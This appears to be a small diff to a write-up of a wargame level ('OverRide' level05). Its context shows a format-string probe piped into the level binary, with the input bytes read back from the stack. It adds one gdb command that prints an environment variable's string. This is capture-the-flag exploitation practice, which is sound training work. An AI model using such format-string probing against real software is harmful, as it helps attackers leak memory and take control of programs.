@@ -90,6 +90,7 @@ level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level
 aaaabbbb 0x61616161 0x62626262
 ```
 
+ x/s *((char**)environ)
 
 
 
